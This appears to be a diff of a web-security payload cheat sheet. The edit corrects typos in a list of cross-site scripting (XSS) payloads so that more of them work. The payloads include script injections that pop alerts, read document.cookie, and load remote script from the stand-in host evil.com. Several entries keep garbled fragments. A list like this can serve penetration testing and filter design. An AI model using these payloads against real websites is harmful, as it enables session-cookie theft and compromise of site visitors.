@@ -2601,9 +2601,9 @@ xip.io：10.0.0.1.xip.io = 10.0.0.1
 - &lt;body onLoad=&quot;while(true) alert(&quot;XSS&quot;),&quot;&gt;
 - &quot;&gt;&lt;/tile&gt;&lt;script&gt;alert(1111)&lt;/script&gt;
 - &lt;/textarea&gt;&#39;&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
-- &#39;&quot;&quot;&gt;&lt;script language=&quot;JavaScript&quot;&gt; alert(&quot;X \nS \nS&quot;),&lt;/- script&gt;
-- &lt;/script&gt;&lt;/script&gt;&lt;&lt;&lt;&lt;script&gt;&lt;&gt;&gt;&gt;&gt;&lt;&lt;&lt;script&gt;alert(123)&lt;/- script&gt;
-- &lt;html&gt;&lt;noalert&gt;&lt;noscript&gt;(123)&lt;/noscript&gt;&lt;script&gt;(123)&lt;/- script&gt;
+- &#39;&quot;&quot;&gt;&lt;script language=&quot;JavaScript&quot;&gt; alert(&quot;X \nS \nS&quot;),&lt;/script&gt;
+- &lt;/script&gt;&lt;/script&gt;&lt;&lt;&lt;&lt;script&gt;&lt;&gt;&gt;&gt;&gt;&lt;&lt;&lt;script&gt;alert(123)&lt;/script&gt;
+- &lt;html&gt;&lt;noalert&gt;&lt;noscript&gt;(123)&lt;/noscript&gt;&lt;script&gt;(123)&lt;/script&gt;
 - &lt;INPUTTYPE=&quot;IMAGE&quot;SRC=&quot;javasctipt:alert(&quot;XSS&quot;);&quot;&gt;
 - &#39;&gt;&lt;/select&gt;&lt;script&gt;alert(123)&lt;/script&gt;
 - &#39;&gt;&#39;&gt;&lt;script src=&#39;http://www.evil.com/XSS.js&#39;&gt;&lt;/script&gt;
@@ -2612,8 +2612,8 @@ xip.io：10.0.0.1.xip.io = 10.0.0.1
 - a=&quot;get&quot;;b=&quot;URL&quot;;c=&quot;javascript:&quot;;d=&quot;alert(&quot;XSS&quot;);&quot;;eval(a- +b+c+d);
 - =&#39;&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
 - &lt;sctipt+src=&quot;&gt;&quot;+src=&quot;http://www.evil.com/XSS.js?68,- 69&quot;&gt;&lt;/script&gt;
-- &lt;body backgroud=jabascript:&#39;&quot;&gt;&lt;script&gt;alert- (navigator.userAgent)&lt;/sctipt&gt;&gt;&lt;/body&gt;
-- &quot;&gt;XaDoS/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;script - src=&quot;http://www.site.com/X
+- &lt;body backgroud=javascript:&#39;&quot;&gt;&lt;script&gt;alert- (navigator.userAgent)&lt;/sctipt&gt;&gt;&lt;/body&gt;
+- &quot;&gt;XaDoS/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;script src=&quot;http://www.site.com/X
 - Data:text/html;charset=utf-7;base64.Ij481.3RpdGod- [jxzY3JpcHQ+YWxlcnQoMIMzNy
 - &quot;&lt;marquee&gt;&lt;img src=k.png onerror=alert(/XSS/)/&gt;
 - &quot;&lt;marquee&gt;&lt;img src=k onerror=alert(/XSS/)&gt;
